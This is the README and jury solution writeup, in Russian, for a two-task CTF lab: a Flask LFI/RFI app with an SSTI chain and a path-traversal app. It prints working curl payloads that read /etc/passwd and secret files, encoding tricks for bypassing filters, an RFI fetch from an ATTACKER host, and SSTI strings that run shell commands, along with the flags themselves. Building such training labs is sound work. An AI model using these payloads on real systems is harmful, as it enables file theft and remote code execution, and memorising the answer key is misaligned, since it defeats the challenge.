# CTF: Old Observatory — two OWASP Top 10 web challenges

Два FLASK-приложения с общей легендой («Старая Обсерватория»), каждое со
своей уязвимостью из OWASP Top 10. Флаг — уникальная строка, зашитая в код
приложения (и продублированная в файле вне web-root, до которого нужно
дотянуться через уязвимость).

| Задание | Уязвимость | OWASP | Порт |
|---|---|---|---|
| `challenge-lfi` — Archive Portal | **LFI + RFI** (+ SSTI-цепочка) | A03:2021 Injection | **5050** |
| `challenge-traversal` — Supply Depot | **Path Traversal** | A01:2021 Broken Access Control | **5051** |

Оба приложения пишут **каждое действие пользователя** в отдельную SQLite
БД `userlog.db`, которая монтируется через volume (`./logs/lfi` и
`./logs/traversal`).

## Запуск

```bash
docker compose up --build -d
# http://localhost:5050  -> задание 1 (LFI/RFI)
# http://localhost:5051  -> задание 2 (Path Traversal)
```

Логи действий:

```bash
sqlite3 logs/lfi/userlog.db       "SELECT * FROM user_actions ORDER BY id DESC LIMIT 20;"
sqlite3 logs/traversal/userlog.db "SELECT * FROM user_actions ORDER BY id DESC LIMIT 20;"
```

Таблица: `ts, ip, method, path, query, user_agent, action, detail`.

## Флаги

* Задание 1: `FLAG{lfi_0bs3rv4t0ry_ch4rt3d_c0m3t_7f9x}`
* Задание 2: `FLAG{p4th_tr4vers4l_d3p0t_v4ult_51z3_42}`

Проверка второго флага — эндпоинт `POST /flag-check` (form или JSON `{"flag": "..."}`).

---

# Как эксплуатировать (writeup для жюри)

## Задание 1 — LFI / RFI (порт 5050)

### Вектор 1: Local File Inclusion через `/page?file=`

Эндпоинт делает `os.path.join(PAGES_DIR, name)` без проверки выхода за
каталог. Игрок замечает это по подсказке в `/page?file=help.html`
(«never let the shelf path escape ../ territory»).

Прочитать исходник приложения, где зашит флаг:

```bash
curl "http://localhost:5050/page?file=../app.py" | grep FLAG
```

Прочитать флаг-файл вне web-root (в контейнере он лежит в /opt/secrets):

```bash
curl "http://localhost:5050/page?file=../../opt/secrets/flag.txt"
```

Классические разведочные запросы:

```bash
curl "http://localhost:5050/page?file=../../../../etc/passwd"
curl "http://localhost:5050/page?file=../../../../proc/self/environ"   # env, LOG_DB, пути
```

Итог: `FLAG{lfi_0bs3rv4t0ry_ch4rt3d_c0m3t_7f9x}`.

### Вектор 2: Remote File Inclusion через `/lang?src=<url>`

Сервер сам загружает язык-пак по URL от игрока и рендерит его содержимое
как Jinja-шаблон (RFI → SSTI цепочка).

1. Игрок поднимает свой HTTP-сервер с payload'ом:

```bash
echo '{{ config["SECRET_FLAG"] }}' > pack.txt
python3 -m http.server 8080
```

2. Заставляет приложение загрузить удалённый файл:

```bash
curl "http://localhost:5050/lang?src=http://ATTACKER:8080/pack.txt"
# в ответе отрендерится FLAG{lfi_0bs3rv4t0ry_ch4rt3d_c0m3t_7f9x}
```

Более жёсткий RFI/SSTI-payload (чтение файла серверной стороной):

```
{{ ''.__class__.__mro__[1].__subclasses__() }}          # перечислить классы
{{ cycler.__init__.__globals__.os.popen('cat /opt/secrets/flag.txt').read() }}
```

Оба вектора фиксируются в БД-логе действиями `page_view`, `rfi_fetch`.

## Задание 2 — Path Traversal (порт 5051)

### Эксплуатация `/download?file=`

Эндпоинт отдаёт файлы из `warehouse/public`, но путь строится как
`os.path.join(PUBLIC_DIR, name)` без нормализации/проверки containment.
На главной странице есть подсказка: «internal paperwork lives in ../vault».

Прямо прочитать флаг из хранилища:

```bash
curl "http://localhost:5051/download?file=../vault/flag.txt"
# -> FLAG{p4th_tr4vers4l_d3p0t_v4ult_51z3_42}
```

Прочитать исходник приложения (флаг зашит в коде):

```bash
curl "http://localhost:5051/download?file=../../app.py" | grep FLAG
```

ДругиеInteresting цели в контейнере:

```bash
curl "http://localhost:5051/download?file=../../../../../etc/passwd"
curl "http://localhost:5051/download?file=../../../opt/depot-vault/master.key"
curl "http://localhost:5051/download?file=../vault/security_notes.txt"   # decoy-документ
```

Обход фильтров (если бы `%2e%2e` резались — полезная практика для игроков):

```bash
curl "http://localhost:5051/download?file=..%2f..%2fvault%2fflag.txt"
curl "http://localhost:5051/download?file=....//vault/flag.txt"
```

Отправка флага на проверку:

```bash
curl -X POST -H 'Content-Type: application/json' \
     -d '{"flag":"FLAG{p4th_tr4vers4l_d3p0t_v4ult_51z3_42}"}' \
     http://localhost:5051/flag-check
```

Все шаги попадают в `logs/traversal/userlog.db` (`download_try`,
`download_ok`, `flag_check`) — организатор видит ход решения.

## Структура проекта

```
docker-compose.yml
challenge-lfi/        app.py Dockerfile requirements.txt pages/ langs/
challenge-traversal/  app.py Dockerfile requirements.txt warehouse/{public,vault}/
logs/{lfi,traversal}/ <- volumes с SQLite-БД пользовательских действий
```
